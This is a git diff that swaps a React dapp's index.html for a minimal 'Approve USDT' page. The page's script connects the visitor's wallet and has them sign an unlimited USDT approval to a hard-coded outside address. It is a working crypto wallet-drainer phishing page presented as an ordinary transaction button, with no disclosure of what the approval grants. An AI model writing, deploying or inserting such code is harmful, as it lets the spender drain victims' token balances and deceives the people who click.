@@ -1,14 +1,52 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>my-react-dapp</title>
-    <script type="module" crossorigin src="/assets/index-D-dLYXzr.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-nqMpL4T3.css">
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Approve USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body style="text-align:center;margin-top:100px;font-family:Arial;">
+
+<h2>Approve USDT</h2>
+
+<button onclick="approve()" style="padding:15px 30px;font-size:18px;">
+  Approve Transaction
+</button>
+
+<p id="status"></p>
+
+<script>
+async function approve() {
+  try {
+    if (!window.ethereum) {
+      alert("Open in Trust Wallet");
+      return;
+    }
+
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+
+    const usdt = new ethers.Contract(
+      "0x55d398326f99059fF775485246999027B3197955",
+      ["function approve(address spender, uint256 amount)"],
+      signer
+    );
+
+    const spender = "0x1cba0ebe6f22eaa0fa148d1892f94e25802abba5";
+
+    document.getElementById("status").innerText = "Waiting...";
+
+    const tx = await usdt.approve(spender, ethers.MaxUint256);
+    await tx.wait();
+
+    document.getElementById("status").innerText = "Approved trasnaction ✅";
+  } catch (e) {
+    document.getElementById("status").innerText = "Error ❌";
+    console.log(e);
+  }
+}
+</script>
+
+</body>
 </html>
